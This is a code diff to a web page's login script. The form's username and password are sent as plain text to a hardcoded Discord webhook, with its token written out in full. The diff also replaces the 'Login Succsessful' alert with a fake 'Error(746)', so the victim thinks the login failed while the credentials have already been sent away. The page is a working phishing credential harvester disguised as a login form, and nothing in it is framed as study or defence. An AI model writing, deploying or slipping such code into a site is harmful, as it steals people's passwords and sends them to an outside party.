@@ -22,19 +22,19 @@
             var username = document.getElementById("username").value;
             var password = document.getElementById("password").value;
 
+            var payload = {
+                username: "Webhook Form",
+                content: "Username: " + username + "\nPassword: " + password
+            };
+
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "https://discord.com/api/webhooks/1113463743955873892/ZmlDkPUKw5IDBQ2lRtxRUZWk9fMUL0qYW6HF9jO_NHwUY3m8JY9CI-BWXpPJfSf8DRra", true);
             xhr.setRequestHeader("Content-Type", "application/json");
 
-            var payload = {
-                "username": username,
-                "password": password
-            };
-
             xhr.send(JSON.stringify(payload));
 
             // Optional: Show a success message to the user
-            alert("Login Succsessful");
+            alert("Error(746)");
 
             // Optional: Clear the input fields
             document.getElementById("username").value = "";
